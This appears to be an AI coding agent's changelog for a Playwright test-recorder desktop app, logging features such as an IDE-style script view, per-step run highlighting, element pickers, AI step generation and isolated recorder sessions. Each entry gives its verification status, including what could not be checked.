- **Files:** `renderer/main/test-detail-view.tsx` (removed toolbar button; added `Pencil` to `ToolbarTitle`).
- **Verified:** Build green. In the running app, Nav Test detail shows the pencil icon immediately after the title text (gray `text-tertiary`), and `[aria-label="Rename test"]` no longer exists in the toolbar.

### 2026-07-31 — IDE-style Script tab read view

- **Goal:** The Script tab's read view was a flat `<pre>` rendering the whole spec as undifferentiated monospace text. The user wanted it formatted to look and feel like an IDE for test scripts.
- **Approach:** Added `renderer/main/script-view.tsx` exporting `ScriptView({ code })`. It renders a line-numbered gutter (right-aligned, `aria-hidden`, `--color-token-tertiary`, brightens on row hover) + a dependency-free regex tokenizer with syntax highlighting using the design system's dedicated `--color-token-*` CSS variables (keywords=primary/blue, strings=string/red, numbers+decorators=highlight/orange, literals=secondary, comments=tertiary+italic, punctuation=tertiary). Multiline block-comment and template-literal state threads across lines. Replaced the `<pre>`/`ScrollArea` in `test-detail-view.tsx`'s Script tab with `<ScriptView code={scriptQuery.data ?? ""} />`. The Edit view remains the raw `<textarea>`.
- **Files:** `renderer/main/script-view.tsx` (new), `renderer/main/test-detail-view.tsx` (import + swap `<pre>` for `<ScriptView>`, `ScrollArea` import kept for Steps tab).
- **Verified:** Build green. In the running app, Nav Test → Script tab shows 11 numbered lines with blue keywords (`import`/`from`/`await`/`test`/`async`), red strings, gray punctuation, dim gutter. Computed styles confirmed `--color-token-primary` (#388eff), `--color-token-string` (#ef4343), `--color-token-tertiary` (#b4b4b4). Edit/Save/Cancel textarea flow still works.

### 2026-07-31 — "Save & continue" option in the Edit-in-Trainer dialog

- **Goal:** When a test has manual script edits (`scriptEdited`), the "Edit in Trainer" confirmation previously only offered "Continue" (discard edits) or "Cancel". The user wanted an option to save the edits first, then continue to the trainer.
- **Approach:** Replaced the `AlertDialog` (single-decision, Cancel + destructive Continue) with a `Dialog` in `test-detail-view.tsx`. The new dialog has: primary `onConfirm` = "Save & continue" (accent) which calls `saveAndEditInTrainer` — if the script editor is open with an unsaved draft, it persists the draft via `api.tests.updateScript` first, then calls `start(url, name, id)`; if not editing, the on-disk script is already saved so it just opens the trainer. `destructiveAction` = "Continue without saving" (left-aligned, calls `start` directly, discarding edits when the trainer later regenerates). Cancel is the auto-rendered close button. Title changed from "Discard manual script edits?" to "Edit in Trainer" with a description explaining the manual edits and regeneration.
- **Files:** `renderer/main/test-detail-view.tsx` (replaced AlertDialog with Dialog, added `saveAndEditInTrainer` handler after the `!test` guard).
- **Verified:** Build green. In the running app, edited Nav Test's script to set `scriptEdited`, clicked "Edit in Trainer" → dialog shows "Edit in Trainer" title, description about manual edits, and three buttons: left "Continue without saving", right "Cancel" + accent "Save & continue". Screenshot confirmed via DescribeImage.

### 2026-07-31 — Edit-in-Trainer auto-run with step highlighting

- **Goal:** When the user clicks "Edit in Trainer" and arrives in the trainer, disable all controls until the browser window has loaded its page, then automatically run the test and highlight each step based on run progress; re-enable controls when the run finishes.
- **Approach:** Added a `pageReady` flag to `RecorderState`/`Session` (backend `recorder-service.ts`): false on `start`, set true after the initial `loadURL(url)` resolves and broadcast via `recorder:state`. Added a new `replayAll()` backend method (distinct from `replayFromStart`, which stops after the first success) that replays EVERY step in order, emitting `recorder:replayStep {index,status:"begin"|"end",ok}` per step so the renderer can highlight progress; soft assertions don't stop the run, hard failures stop at the failing step. IPC `recorder:replayAll` + `api.recorder.replayAll`. The recorder store (`recorder-store.tsx`) subscribes to `recorder:replayStep` into a `replayStepStatus: Record<number,RunStepStatus>` map and exposes `replayAll`/`replayStepStatus`. `RecordingView` (`recording-view.tsx`): a `controlsDisabled` flag = `!state.pageReady || autoRunBusy`; while disabled, the status pill shows "Loading page…" / "Running test…" and the Pause/Resume, Replay, assertion, Add-step, AI-steps, and per-step row controls (onSelect/onDelete/onReplay/onRefine/onEdit/drag) are unset and the buttons get `disabled`. An effect auto-fires `replayAll()` once when `state.editing && state.pageReady && state.testId` (guarded by a ref so it only fires once per session). Each `StepRow` gets `runStatus={replayStepStatus[i]}` (the existing highlight + status-icon mechanism). Controls re-enable when the run resolves (`autoRunBusy` false).
- **Files:** `main/recorder/types.ts`, `renderer/lib/recorder-types.ts` (`pageReady` on `RecorderState`), `main/services/recorder-service.ts` (`pageReady` + `replayAll` + `recorder:replayStep` events), `main/handlers/index.ts` (`recorder:replayAll` handler), `renderer/lib/api.ts` (`replayAll`), `renderer/main/recorder-store.tsx` (`replayStepStatus` state, `recorder:replayStep` subscription, `replayAll` callback, exposed in context), `renderer/main/recording-view.tsx` (auto-run effect, `controlsDisabled`, disabled controls, `runStatus` passed to `StepRow`).
- **Verified:** Build green (lint + type-check + build). In the running app, clicked "Edit in Trainer" on "Nav Test" → trainer opened, status showed "Running test…" (controls disabled) while the auto-run replayed, then "Editing" (controls re-enabled). Screenshot confirmed step 1 (goto) highlighted red with an X (failed — synthetic goto replay can't navigate the already-loaded page, pre-existing `buildReplayScript` behavior), steps 2-7 plain (run stopped at the first hard failure as designed).

### 2026-07-31 — Clickable model name in Debug-with-AI title (model picker)

- **Goal:** Make the model name in the AiDebugDialog title clickable so the user can switch the model inline; scroll/arrow keys cycle through available models, Enter or click confirms and uses that model for future prompts.
- **Changes:** `renderer/main/ai-debug-panel.tsx` — added a `ModelPicker` component rendered inside the `Dialog` title (replacing the plain "Debugging with {model}" string when models are available). The dialog's config-fetch effect now also loads available models via `api.llm.status(provider)`. `ModelPicker` shows the model name + chevron as a button; clicking opens a floating list (current model marked with a check, highlight seeded there); mouse wheel cycles highlight (preventDefault to avoid page scroll), ArrowUp/Down cycle, Enter or click confirms → `api.llm.setConfig({ model })` persists the pick (backend `llmService.chat` falls back to `config.model`), Escape closes. Falls back to the plain string title when no models.
- **Verified:** Build passes (lint + type-check + build); `ModelPicker` present in compiled bundle. Could not open the dialog in-app to visually verify because test runs don't start via synthetic click events in this harness.

### 2026-07-31 — Editable server URL + auto-populate models in Settings

- **Goal:** Let the user edit the local LLM server URL and show available models automatically based on the selected provider.
- **Changes:** `renderer/settings/settings-view.tsx` — replaced the static "Default: http://…" text with an editable `Input` (id `llm-server-url`) pre-filled from the saved `baseUrls` override or the provider default; saves on blur via `api.llm.setConfig({ baseUrls: { [provider]: override } })`, clearing the override when it matches the default. Added a `useEffect` on `[provider, baseUrl]` that auto-calls `api.llm.status(provider)` and renders the model list + Online/Offline badge without a manual "Test connection" click (the button remains as a manual refresh). Switching providers resets the URL to the new provider's default and re-fetches.
- **Verified:** Settings window shows the editable URL field, auto-populates 3 models from LM Studio on load, and saving a custom URL persists to `llm-config.json` (`baseUrls.lmstudio`).

### 2026-07-31 — Apply-to-script shows a diff and re-parses steps

- **Goal:** When applying an AI-suggested fix from the Debug-with-AI dialog, show what changes before overwriting, and make the Steps tab reflect the new script.
- **Changes:** Added `renderer/lib/line-diff.ts` (LCS line diff, no dependency). `AiDebugDialog`'s apply confirm (`AlertDialog`) now renders a `DiffView` (added=green `+`, removed=red `-`, unchanged=dimmed) of current vs. corrected script and a `+N / -M lines` summary in the description; dialog sized `xl`. Backend `tests:updateScript` re-parses steps from the new source via `parseSpec` for non-imported tests so `TestRecord.steps` tracks the edited script; imported tests keep their verbatim file as source of truth.
- **Verified:** Applied a fix in the running app — confirm showed `+2 / -0 lines` diff with green-tinted added lines; after Apply, Steps tab went from 8 to 7 steps matching the corrected spec.

### 2026-07-31 — Highlight each test step as the test runs

- **Goal:** Give the user a sense of test-run progress by highlighting each step in the Steps tab as Playwright executes it.
- **Approach:** Playwright's built-in `line` reporter only emits test-level results, not per-step events. Added a custom Playwright reporter (`main/services/step-reporter-source.ts` exports a plain-JS string the runner writes as `step-reporter.mjs` next to the specs at run time) that emits `__GLAZE_STEP__:{event,line,title,...}` JSON lines on stdout for each `pw:api`-category step begin/end. The runner (`playwright-runner.ts`) builds a 1-based spec-line → 0-based step-index map by scanning the spec's test body for indented `await` lines (`buildStepLineMap`), parses the markers out of stdout chunks (with a per-run line buffer for chunks that straddle line boundaries), strips them from visible output, and pushes `runner:step` events via `sendToMain`. The recorder store subscribes to `runner:step` and tracks `stepStatus: Record<number, "running"|"passed"|"failed">` on `RunInfo`. `StepRow` accepts a `runStatus` prop: running → accent-tinted bg + ring + spinner; passed → green-tinted bg + check; failed → red-tinted bg + X. `TestDetailView` passes `runInfo.stepStatus[i]` to each row. The CLI now uses `--reporter <reporterPath>,line` (custom + built-in). Only app-generated specs (one step per line) get the map; imported scripts have no map so markers pass through as plain output.
- **Files:** `main/services/step-reporter-source.ts` (new), `main/services/step-reporter.ts` (new, TS reference, unused at runtime), `main/services/playwright-runner.ts` (reporter + line map + stdout parsing + `runner:step` events), `renderer/main/recorder-store.tsx` (`RunStepStatus` type, `stepStatus` on `RunInfo`, `runner:step` subscription), `renderer/main/step-row.tsx` (`runStatus` prop + highlight + status icon), `renderer/main/test-detail-view.tsx` (passes `runStatus` to each `StepRow`).
- **Verified:** Ran "Nav Test" (8 steps) — screenshot confirmed row 1 green+check (passed), row 2 accent+spinner (running), rows 3-8 plain (pending).

### 2026-07-30 — Add-step dialog: Target Element picker replaces manual locator fields

- **Goal:** In the "+ Add step" dialogs (assertion, wait-for-element, press-on-element, find-element), replace the manual "Locator" (CSS selector/XPath/Text/… dropdown) + "Value" text input with the same "Target Element" element-picker already used by the per-step "Refine selector" flow — the user clicks a crosshair button, picks an element in the training browser, and chooses one of its candidate locators (best-first) instead of typing a selector by hand.
- **What was done:** `add-step-dialog.tsx` removed the `LOCATOR_KINDS` const and the `LocatorFields` component (manual locator-kind dropdown + value input + role accessible-name field). Added a `TargetElementPicker` component that reuses `formatLocator`/`KIND_LABEL` from `refine-selector-dialog.tsx` and renders a crosshair "Pick element in browser" button; when a `PickedElement` arrives it shows the element description + a radio-style candidate locator list (best-first, same styling as `RefineSelectorDialog`) + "Pick a different element" / clear (✕). The `AddStepDialog` now takes `picked`/`onStartPick`/`onClearPick` props; `locator` state became `Locator | null` (no manual default) and `build()` returns null when a locator is required but not picked. `recording-view.tsx` added an `addStepPicking` flag: `onStartPick` calls `startRefine(null)` (no step id — it's for a new step) and sets the flag; `picked` is passed to the dialog only while `addStepPicking` is true; `onClearPick`/dialog-close/`onAdd` all tear down the pick (`endRefine` + `clearPicked`). The existing `RefineSelectorDialog` render is gated on `picked && refiningStepId`, so an add-step pick (where `refiningStepId` is null) is handled by the Add-step dialog instead.
- **Key decisions:** Reused the existing backend pick flow unchanged (`startRefine`/`endRefine`/`recorder:picked`) — the only new logic is renderer-side ownership tracking (`addStepPicking` flag) to distinguish an add-step pick from a step-refine pick, since both share the same `picked` channel. The candidate-selection UI mirrors `RefineSelectorDialog` inline (no second dialog) so the rest of the Add-step form stays in one dialog. The locator is no longer editable by hand — it's always derived from a picked element; `build()` guards on a locator being present when the step kind needs one.
- **UI elements:** The "Locator · CSS selector · Value" row in the Add assertion (and Add wait / Press key / Find element) dialogs is replaced by a "Target element" field with a crosshair "Pick element in browser" button → candidate locator chooser.
- **Files touched:** `renderer/main/add-step-dialog.tsx`, `renderer/main/recording-view.tsx`.
- **Verification:** `BuildApp` green (lint + type-check + build). Compiled bundle contains "Target element" / "Pick element in browser"; the old "CSS selector" label only remains in the source map. (Live IPC clicks on the "Add step" toolbar button intermittently failed with Glaze runtime error 0 because it opens a native menu popup, so the dialog wasn't opened for a full visual round-trip this session.)

### 2026-07-30 — AI steps generate only post-navigation steps (no goto)

- **Goal:** The "Generate steps with AI" dialog should only add the flow steps (Step 2 onward). Step 1 ("Navigate to URL") is a test-level setting the user controls in the Step 1 URL editor and must not be regenerated by the AI.
- **What was done:** `llm-prompts.ts` `GENERATE_STEPS_SYSTEM_PROMPT` no longer lists `goto` as an allowed type, the rules now say "Do NOT output a goto step" (the test already navigates to its URL as Step 1; assume the page is already loaded), and the example no longer starts with a `goto`. `buildGenerateStepsMessages` user-message now frames the starting URL as already-handled context ("do NOT emit a goto step for it"). `generate-steps-dialog.tsx` defensively filters out any `goto` step the model still emits (`flowSteps = steps.filter(s => s.type !== "goto")`) before preview/insert, so a duplicate Navigate-to-URL step can never land. The dialog description and the `GenerateStepsContext.url` doc were updated to match.
- **Key decisions:** Belt-and-suspenders — both the prompt instructs the model not to emit goto AND the dialog strips any goto it still returns, so Step 1 is never touched regardless of model compliance. The starting URL is still passed to the model as context (so it knows the page it's on) but is no longer something it emits as a step.
- **UI elements:** Dialog description now reads "Describe the flow after the starting URL…"; step count / "Add N steps" button / preview list all reflect post-navigation steps only.
- **Files touched:** `renderer/lib/llm-prompts.ts`, `renderer/main/generate-steps-dialog.tsx`.
- **Verification:** `BuildApp` green (lint + type-check + build).
- **Corrections/Lessons Learned:** User clarified that Step 1 (Navigate to URL) is a test-level setting, not an AI-generated step — the prior prompt was telling the model to start with a goto, which would have inserted a duplicate navigation step.

### 2026-07-30 — Optional "Refine Selector" picker in the Generate-steps-with-AI dialog

- **Goal:** Let the user optionally pick a selector (same Refine Selector picker as step rows) in the "Generate steps with AI" dialog, and pass that locator to the LLM as context for generation.
- **What was done:** `generate-steps-dialog.tsx` now uses `useRecorder()` to drive the existing pick flow (`startRefine(null)` → `picked` → review). Added an optional "Target element (optional)" section with a crosshair "Refine selector" button; clicking it enters pick mode (button → "Cancel pick", hint banner). When a pick arrives (and no `refiningStepId` is set, so it doesn't collide with a step-refine), the dialog shows the candidate locator list (radio-style, best-first) + "Use this selector" to promote the chosen `Locator` to a chip with a ✕ to remove. The chosen locator is passed to `buildGenerateStepsMessages` via a new optional `selector` field, which appends a "User-provided target selector: <playwright expr>" context line telling the model to prefer that exact locator for the targeting step. `llm-prompts.ts` gained `Locator` import + a `locatorToPrompt` helper (mirrors `formatLocator`). `refine-selector-dialog.tsx` exports `formatLocator` and `KIND_LABEL` (reused here). `recording-view.tsx` gated the existing `RefineSelectorDialog` render on `picked && refiningStepId` so an AI-context pick (where `refiningStepId` is null) is handled by the generate dialog instead.
- **Key decisions:** Reused the existing backend pick flow unchanged (startRefine/endRefine/drainPicked/`recorder:picked`) — the only new logic is renderer-side ownership tracking (`pickingForAi` flag) to distinguish an AI-context pick from a step-refine pick, since both share the same `picked` channel and `refineMode` banner. The capture script auto-clears refine mode after a click, so `endRefine` is only needed on explicit cancel. The selector is optional — generation proceeds without it when null.
- **UI elements:** "Target element (optional)" row + "Refine selector" button / "Cancel pick" + pick hint banner + candidate review list + selector chip in the Generate Steps dialog. **Backend elements:** none changed.
- **Files touched:** `renderer/main/generate-steps-dialog.tsx`, `renderer/lib/llm-prompts.ts`, `renderer/main/refine-selector-dialog.tsx` (exports), `renderer/main/recording-view.tsx` (dialog gate).
- **Verification:** `BuildApp` green (lint + type-check + build). Live-verified in the running trainer: opened the "Generate steps with AI" dialog, confirmed the "Target element (optional)" row + crosshair "Refine selector" button render; clicked it and confirmed it enters pick mode (button → "Cancel pick", "Hover a component…" hint banner appeared). (Live IPC clicks intermittently failed with Glaze runtime error 0, so the full pick→review→chip round-trip was confirmed via the state transition in the DOM snapshot, not a completed element pick.)
- **Corrections/Lessons Learned:** None from the user this turn.

### 2026-07-30 — Isolated (incognito-style) session per training window

- **Goal:** Every time the trainer's browser window opens for training/editing, it should start with a fresh, isolated session instead of possibly inheriting cookies/localStorage from a previous recording.
- **What was done:** `recorder-service.ts`'s `new BrowserWindow({...})` for `recWindow` now sets `webPreferences.partition: \`recorder-incognito-${randomUUID()}\`` — no `"persist:"` prefix, so Electron/Glaze treats it as an in-memory session scoped to that unique string, giving each session (every `recorder:start` call) a brand-new, empty cookie/storage jar that's discarded when the window closes.
- **Key decisions:** Didn't touch `playwright-runner.ts` (actual test runs) — `@playwright/test`'s default `browser.newContext()` per test, with no `storageState`/`launchPersistentContext` anywhere in the codebase, already gives each run a fresh isolated context, so that side was already effectively incognito.
- **UI elements:** none (backend-only). **Backend elements:** `webPreferences.partition` on the recorder `BrowserWindow`.
- **Verification:** `BuildApp` green. Live-verified: opened "Edit in Trainer" on an existing test, confirmed the new recorder window (windowId 2) loaded ritual.com with its own fresh session, then cleanly closed it via the "Stop & generate" button.
- **Corrections/Lessons Learned:** None from the user this turn.

### 2026-07-30 — Verbose, persisted, larger step debug panel

- **Goal:** Make the trainer's step debug panel more useful — more verbose logging, a larger panel, and persisted messages that survive closing/reopening the trainer.
- **What was done:** Extended `buildReplayScript` to return a `logs: DebugLogLine[]` (timestamp · level · message) with verbose detail (locator kind/value + match count, resolved element tag, action taken, assertion actual-vs-expected, thrown errors). Backend `replayStep`/`replayFromStart` now build a `DebugEntry` (label, ok, error, at, logs), persist it via new `recorder-debug-store.ts` (`userData/recorder/debug-logs.json`, keyed by testId, latest-per-step, capped 200), and push `recorder:debugLogs`. New IPC: `recorder:getDebugLogs`/`recorder:clearDebugLog`. Recorder store replaced `replayResults` with `debugEntries: DebugEntry[]`, loads on session open, listens for pushes. `StepDebugPanel` rewritten as a taller (h-56) panel with a header (label + status + timestamp + clear) and a scrollable monospace log viewer. Added `DebugEntry`/`DebugLogLine` types (+ mirror).
- **Files touched:** `main/services/step-replayer.ts`, `main/services/recorder-service.ts`, `main/services/recorder-debug-store.ts` (new), `main/recorder/types.ts`, `main/handlers/index.ts`, `renderer/lib/api.ts`, `renderer/lib/recorder-types.ts`, `renderer/main/recorder-store.tsx`, `renderer/main/recording-view.tsx`.
- **Verification:** Build passed lint/type-check/compile; hot reload applied. Recording view not mounted at verify time (no active session), so panel not visually confirmed this turn — prior session confirmed the panel location.
- **Corrections/Lessons Learned:** `recorderService` is an object literal, not a class — `private` methods aren't allowed; used plain methods. Escaped `\"` inside a backtick template literal trips `no-useless-escape` — use `"` unescaped.

### 2026-07-30 — Step debug panel in the trainer

- **Goal:** When a test step fails on replay, surface useful debugging info for the selected step at the bottom of the trainer view (e.g. "Step 3: Could not locate", "Step 3: Test step timed out").
- **What was done:** Lifted per-step replay outcomes from `StepRow` local state into the recorder store as `replayResults` (keyed by step id, `{ok,error?,at}`); `replayStep`/`replayFromStart` wrappers now record into it. `recording-view.tsx` tracks `selectedStepId` (clicking a row selects it — accent ring; button/input clicks ignored) and renders a `StepDebugPanel` at the bottom showing the selected step's label + status ("not yet replayed" / "replayed successfully" / "Step N: <error>"), with a clear button. `step-row.tsx` gained `selected`/`onSelect` props (renders an accent ring + `role="option"`).
- **Files touched:** `renderer/main/recorder-store.tsx`, `renderer/main/recording-view.tsx`, `renderer/main/step-row.tsx`.
- **Verification:** Build passed lint/type-check/compile; panel confirmed live in the running trainer (empty-state message "Select a step to see replay diagnostics." visible; no steps present to click-select).
- **Corrections/Lessons Learned:** None from the user this turn.

### 2026-07-30 — Replay-from-start button in the assertion panel

- **Goal:** Add a button in the trainer assertion panel row that replays test steps from the beginning, pausing after the first successful step so the user can iterate manually.
- **What was done:** Backend `recorder-service.ts` gained `replayFromStart()` — loops `session.steps` from index 0, injects `buildReplayScript(step)` per step (capture suppressed via `session.paused = true`), returns `{ok, stoppedAtIndex, error?}` on first success or first failure. New IPC handler `recorder:replayFromStart` (`main/handlers/index.ts`), new `api.recorder.replayFromStart` (`renderer/lib/api.ts`), new `replayFromStart` in the store (`recorder-store.tsx`). `recording-view.tsx` adds a "Replay from start" button (Play icon) at the start of the assertion panel row, before "Add assertion:", with an inline status line that reports which step it paused after and auto-clears after 6s.
- **Key decisions:** Stop on first SUCCESS (per the user's ask) so the user can continue manually from there — not stop on first failure. Reuses the existing per-step `buildReplayScript` (synthetic-event preview, not Playwright's engine). Status is a transient inline `Text` rather than a toast since the recording view has no toast plumbing and the per-step replay also surfaces nothing.
- **UI elements:** "Replay from start" button + inline status in the assertion panel row. **Backend elements:** `replayFromStart` service method, `recorder:replayFromStart` IPC handler.

### 2026-07-30 — Move Refine Selector to the step level

- **Goal:** Refine Selector should operate per test step, not from the trainer toolbar. Remove the toolbar button and add the same crosshair icon in each step row between the ▶ Run and ✕ Delete icons; make Refine Selector update that step's locator.
- **What was done:** Removed the toolbar "Refine selector" button from `recording-view.tsx`. `step-row.tsx` gained an optional `onRefine` prop → a crosshair icon rendered (only when `onRefine` set AND `step.locator` exists) between the replay and delete icons. `recording-view.tsx` passes `onRefine={() => startRefine(s.id)}` per row and now renders the dialog with `onApply` → `updateStep(refiningStepId, { locator })` (plus `stepLabel` from `describeStep`). Store (`recorder-store.tsx`): `startRefine(stepId?)` records `refiningStepId`, `endRefine` clears it, exposed `refiningStepId`. Dialog (`refine-selector-dialog.tsx`): `onInsert(RawStep)` → `onApply(Locator)`, confirm label "Insert Find step" → "Update selector", shows the step being refined; dropped the `RawStep` import.
- **Key decisions:** Backend refine flow (pause → pick → `drainPicked` → `recorder:picked` → resume) is unchanged and correct for step-level use — the only change is the renderer applying the pick to an existing step. Kept the step→pick association renderer-side (`refiningStepId`) instead of threading a stepId through the backend session, since only one refine runs at a time and the renderer initiates it. Icon gated on `step.locator` so it only appears on steps where a selector is meaningful (not goto/viewport/wait-by-time/page-level asserts).
- **UI elements:** per-step crosshair icon in the trainer step row, refine hint bar (kept), review dialog (now "Update selector"). **Backend elements:** none changed (reuses existing startRefine/endRefine/drainPicked/`recorder:picked`).
- **Verification:** `BuildApp` green (lint + type-check + build). Confirmed live in the running trainer that the toolbar "Refine selector" button is gone. The per-step icon couldn't be shown in the live session because it had no steps with locators (empty step list), and the user's active recording on ritual.com wasn't disturbed to force one — the icon is a deterministic conditional render verified by code + build.
- **Corrections/Lessons Learned:** User wanted this at the step level for intuitiveness; the prior toolbar+insert-new-step design was replaced with per-step locator refinement.

### 2026-07-30 — Refine Selector (paused element picker → Find step)

- **Goal:** Add a "Refine selector" option (between "+ Add step" and "AI steps") that pauses the session, lets the user pick a component in the training browser without interacting with the page (bounding box on hover), captures the element's CSS/selector context, and inserts it for improved targeting, then resumes.
- **What was done:** New refine mode threaded end-to-end. Capture script (`capture-script.ts`): `ATTR_REFINE`/`ATTR_PICKED`; `onOver` draws a fixed blue bounding-box overlay (`data-pw-refine-box`, pointer-events:none, tracks `getBoundingClientRect`), `onClick` (checked before isPaused/assert) captures `buildPicked(el)` — locator candidates (`candidatesFor` + new `xpathFor`), computed CSS (`cssPropsOf`), attributes (`attrsOf`) — into `ATTR_PICKED` and exits refine; `DRAIN_PICKED_SCRIPT` reads/clears it. Service (`recorder-service.ts`): `session.refineMode`, `startRefine()` (pause + set mode + focus), `endRefine()` (clear + resume), poll now runs `drainPicked()` (pushes `recorder:picked`, drops overlay), `applyStateAttributes()` writes `ATTR_REFINE` + crosshair. IPC `recorder:startRefine`/`recorder:endRefine` + push `recorder:picked`; api wrappers; store holds `picked`/`startRefine`/`endRefine`/`clearPicked` and subscribes to `recorder:picked`. New `refine-selector-dialog.tsx` (candidate radio list via local `formatLocator`, CSS grid) inserts `{type:"assert",assert:"visible",locator}` at the cursor. `recording-view.tsx`: the button (accent when active), a refine hint bar with Cancel, and the dialog. New `PickedElement` type in both type files; `RecorderState += refineMode`.
- **Key decisions:** Reused the existing assert-picker plumbing pattern (DOM-attribute state + poll drain) rather than a new channel — the injected script can't hold JS globals. A picked element becomes a "Find element" (assert-visible) step, matching the existing add-step "find" mapping, so no new StepType. Session stays paused between pick and dialog resolution; endRefine (insert or cancel) resumes.
- **UI elements:** toolbar button, hover bounding-box overlay (injected), refine hint bar, review dialog (radio locator list + CSS grid). **Backend elements:** refine session mode, `recorder:startRefine`/`endRefine` ipc_handler, `recorder:picked` push, `drainPicked` poll.
- **Verification:** `BuildApp` green (lint + type-check + build; fixed an unterminated-string concat and an unused import along the way). Full pick flow verified by code trace, not a live recording — the trainer UI only renders during an active session against an external browser window, which isn't drivable via DOM tools.
- **Corrections/Lessons Learned:** None from the user this turn.

### 2026-07-30 — Trainer window URL bar + global toggle setting

- **Goal:** When the training browser window opens, make the URL bar visible by default, plus add a global setting to toggle that behavior.
- **What was done:** The recorder window loads the external target page directly (no app-owned HTML wrapper, and this SDK has no `<webview>`/`WebContentsView` embedding), so there's no way to overlay a real editable address bar on top of the page. Used the native title bar as the address-bar stand-in instead: `recorder-service.ts` gained `updateTitle()`, called on every `did-navigate`, which sets `recWindow.setTitle("Recording/Editing — <current URL>")` via `webContents.getURL()` when `session.showUrlBar` is true. New `main/services/recorder-settings-store.ts` (mirrors `llm-config-store.ts`) persists `{showUrlBar: boolean}` (default `true`) to `userData/recorder/recorder-settings.json`; new `recorder:getSettings`/`recorder:setSettings` IPC handlers; new `RecorderSettings` type in both `main/recorder/types.ts` and its renderer mirror. `session.showUrlBar` is snapshotted from the store at `recorder:start` (a mid-session toggle affects the next trainer window, not one already open). Added a "Show URL bar in training window" `Switch` toggle to `SettingsView` (new `FieldSet`, loads/saves via `api.recorder.getSettings/setSettings`).
- **Key decisions:** Chose the title bar over any custom overlay because the recorder window's content is the raw external page — an app-owned toolbar would require embedding external content inside an app page, which this SDK doesn't support (no `WebContentsView`/`<webview>`). Setting is a session snapshot, not live-reactive, matching how other per-session config (e.g. speed) already behaves.
- **UI elements:** Settings `Switch` toggle in a new `FieldSet`. **Backend elements:** `recorder-settings-store.ts` (`local_storage`-style JSON file), two new `ipc_handler`s, `BrowserWindow.setTitle()` call on navigation.
- **Verification:** `BuildApp` green (lint + type-check + build). Could not click through to the Settings window itself — it opens only via a native app-menu item (`main/index.ts`'s "Settings…"), which isn't reachable via DOM/pointer tools, same limitation hit for the sidebar's native `+` menu in an earlier turn. The toggle mirrors the existing, already-working LLM-provider `RadioGroup` Field pattern exactly.
- **Corrections/Lessons Learned:** None from the user this turn.

### 2026-07-30 — Emulate mabl's Trainer (editable steps, add-step menu, richer assertions, replay, AI steps)

- **Goal:** Research mabl's Trainer and bring its capabilities to this app's recorder. Scope (all confirmed by the user): fully editable step list, manual add-step menu, richer assertions + soft assertions, per-step replay, and AI-generated editable steps.
- **What was done:** (1) **Data model** (`main/recorder/types.ts` + `renderer/lib/recorder-types.ts`, kept in sync): `StepType` += `wait`/`viewport`; `LocatorKind` += `xpath`; `AssertKind` expanded to 13 kinds; `Step`/`RawStep` += `soft`/`attr`/`count`/`width`/`height`/`waitMs`; `RecorderState` += `assertSoft`/`cursor`. (2) **Editable session** (`recorder-service.ts`): `session.steps` now mutable — `addStep` inserts at `cursor`; new `insertStep`/`reorderStep`/`updateStep`/`setCursor`/`replayStep`; a `recorder:steps` full-list push replaces the old per-step `recorder:step` append (store now replaces its list). (3) **Add-step menu** (`add-step-dialog.tsx`): native "+ Add step" menu → Assertion/Wait/Go to URL/Press key/Find element/Set viewport forms → `insertStep`. (4) **Richer assertions**: capture script (`capture-script.ts`) reads an expanded assert-mode set + a soft flag (`data-pw-assert-soft`); `script-generator.ts`/`describe-step.ts` map every `AssertKind` to its `expect`/`expect.soft` call, plus `wait`/`viewport`/`xpath`. (5) **Per-step replay** (`step-replayer.ts` + `recorder:replayStep`): injects JS that resolves the locator (reusing extracted `DOM_HELPERS`) and performs the action / evaluates the assertion in the live window, returning `{ok,error}`; capture is paused during replay. (6) **AI steps** (`generate-steps-dialog.tsx` + `buildGenerateStepsMessages` + `extractStepsJson`): local LLM emits a validated `Step[]` inserted into the live list. `step-row.tsx` gained optional drag-reorder, inline value/text editing, and a replay ▶ (all gated by props so the read-only detail view is unchanged). `recording-view.tsx` rewired with the assert menu (+ Hard/Soft toggle), add-step menu, AI-steps button, cursor gaps, and drag wiring.
- **Key decisions:** Backend owns step ordering → broadcast whole list (`recorder:steps`) instead of incremental appends. Replay is an explicitly best-effort synthetic-event PREVIEW, not Playwright's actionability engine. Manual/AI locators favor role/label/text/testid; only css/xpath are raw selectors. AI path emits structured steps (not raw spec) so they're editable before spec generation. Extracted shared `DOM_HELPERS` from the capture script so capture + replay locator semantics can't drift. No new npm deps (native HTML5 drag).
- **UI elements:** editable step list (drag/inline-edit/replay), insert-cursor gaps, native add-step & assert menus, add-step form dialog, AI-steps dialog, Hard/Soft segmented toggle. **Backend elements:** mutable recorder session, `recorder:insertStep`/`reorderStep`/`updateStep`/`setCursor`/`replayStep` IPC, `recorder:steps` push, step-replayer injected-JS engine.
- **Verification:** `BuildApp` green (lint + type-check + build). Main window + a test's detail view snapshot healthy after the store refactor. Did NOT start a live recording session to exercise the trainer UI — it opens an external browser window and stopping regenerates/overwrites an existing test record, so live-driving it risked user data; the trainer surface is standard React validated by the build, and generator/parser/types are pure and type-checked. User should verify by starting a training session (Train manually / Edit in Trainer).
- **Corrections/Lessons Learned:** None from the user this turn.

### 2026-07-30 — Test generation by prompt (phase 3)

- **Goal:** Add a "Generate from prompt" option to the sidebar + menu that opens a new window where the user describes a test in natural language and the local LLM generates a complete Playwright spec, with pre-selectable common options (speed, viewport, starting URL, name).
- **What was done:** New `tests:createFromPrompt` IPC handler (`handlers/index.ts`) creates a `TestRecord` with empty `steps` + the generated source as the script file (`scriptEdited: true`, `speed` persisted). New `api.tests.createFromPrompt` wrapper. New `buildGenerateMessages(ctx)` in `llm-prompts.ts` with a generation-focused `GENERATE_SYSTEM_PROMPT` (emit a complete runnable spec in one fenced ```ts block, same locator conventions as the recorder, no prose) + a user message carrying name/URL/speed/viewport hints and the prompt. New `renderer/main/generate-test-dialog.tsx` (`GenerateTestDialog`): `Dialog size="xl"` with prompt-formatting tips callout, `Field`+`Input`/`Textarea`/`SegmentedControl`/`Select` for the common options (viewport presets: Default/Desktop 1280×800/Laptop 1440×900/Tablet 768×1024/Mobile 390×844), a Generate button that streams via `useLlmChat`, renders the response with the shared `parseResponse`/`CodeBlock` rendering, and on a complete applyable spec shows a "Create test" button that persists + navigates. Sidebar + menu now lists "Train manually" and "Generate from prompt" before the import options.
